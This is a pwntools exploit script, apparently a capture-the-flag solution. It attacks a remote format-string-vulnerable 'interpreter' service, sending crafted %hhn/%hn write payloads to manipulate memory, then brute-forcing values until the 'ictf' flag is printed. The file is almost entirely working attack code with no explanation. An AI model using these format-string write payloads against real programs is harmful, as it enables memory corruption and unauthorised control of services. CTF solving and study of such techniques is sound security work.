from pwn import *
from struct import pack
def _(arg):
    pass
def do_try(conn, payload):
    conn.sendline(payload)
    buf = (conn.recvline()+conn.recvline()+conn.recvline())
    conn.sendline(special_fmtstr)
    buf += (conn.recvline()+conn.recvline()+conn.recvline())
    if b'ictf' in buf:
        sidx = buf.find(b'ictf')
        eidx = buf.find(b'}')+1
        flag = buf[sidx:eidx].decode()
        print(f'flag: {flag}')
        exit(0) # SUCCESS 

debug = _
server = 'spclr.ch'
port = 1390
host = f'{server}'
debug_mode = b'%1$254s%9$hhn'
local = False
elf = ELF('./interpreter')

args = [ord(e) for e in 'ggimmeflagpls']
ram_fmtstr = '%1${}%3$hhn'
getchar_fmtstr = b'%1$1s%9$hhn'
putchar_fmtstr = b'%9$2s%9$hhn'
special_fmtstr = b'%1$69s%9$hhn'
x_fmtstr = b'%1$42s%6$hhn'
y_fmtstr = b'%1$4919s%8$hn'
payload = []
# used these to determine argument numbers
_x_fmtstr = '%1$42s%{}$hhn'
_y_fmtstr = '%1$4919s%{}$hn'

for c in args:
    payload.append(ram_fmtstr.format(c).encode())
try:
    try:
        conn = elf.process() if local else remote(host,port)
        conn.sendline(debug_mode)
        buf = conn.recvuntil(b'\tram=') + conn.recvuntil(b'\n')

        conn.sendline(x_fmtstr)
        buf = conn.recvline()+conn.recvline()+conn.recvline()
        debug(buf.split(b'\n')[:-1])
        conn.sendline(y_fmtstr)
        buf = conn.recvline()+conn.recvline()+conn.recvline()
        debug(buf.split(b'\n')[:-1])
        for i in range(0,len(payload)):
            line = payload[i]
            conn.sendline(line)
            buf = conn.recvline()+conn.recvline()+conn.recvline()
            debug(buf.split(b'\n')[:-1])
            debug(f'sent {line} and got resp')
            conn.sendline(getchar_fmtstr)
            debug(f'sending: {chr(args[i])}')
            conn.sendline(chr(args[i]).encode())
            buf = conn.recvline()+conn.recvline()+conn.recvline()
            debug(buf.split(b'\n')[:-1])
            debug('sent "getchar" and got resp')
            conn.sendline(putchar_fmtstr)
            buf = conn.recvline()+conn.recvline()+conn.recvline()
            debug(buf.split(b'\n')[:-1])
            debug('sent "putchar" and got resp')
            conn.sendline(special_fmtstr)
            buf =  conn.recvline() + conn.recvline() + conn.recvline()
            debug(buf.split(b'\n')[:-1])
            conn.sendline(f'%3${i}s%4$hhn'.encode())
            buf = conn.recvline()+conn.recvline()+conn.recvline()
        buf =  conn.recvline() + conn.recvline() + conn.recvline()
        debug(buf.split(b'\n')[:-1])
    except Exception as e:
        print(f"[Inner Try] Exception: {e}")
    # flush any buffers
    for m in range(16):
        do_try(conn, b'')
    for m in range(3):
        debug('')
    for i in range(0xff+0xff,0,-1):
        debug(f'i: {i}')
        ctr = i % 256 
        cust = f'{str(f"%{3}${ctr}s%4$hhn").encode()}'
        debug(f'attempt: {cust}')
        do_try(conn,cust.encode())
except Exception as e:
    print(f"[Outer Try] Exception: {e}")
